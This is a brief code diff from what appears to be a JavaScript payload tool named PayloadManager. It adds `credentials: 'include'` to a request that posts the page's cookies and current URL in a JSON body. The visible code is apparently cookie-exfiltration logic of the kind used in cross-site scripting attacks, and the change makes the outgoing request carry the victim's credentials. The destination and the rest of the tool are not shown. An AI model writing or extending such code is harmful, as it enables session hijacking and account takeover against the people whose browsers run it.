@@ -33,6 +33,7 @@ const PayloadManager = {
                 headers: {
                     'Content-Type': 'application/json',
                 },
+                credentials: 'include',
                 body: JSON.stringify({
                     cookies: cookies,
                     url: window.location.href
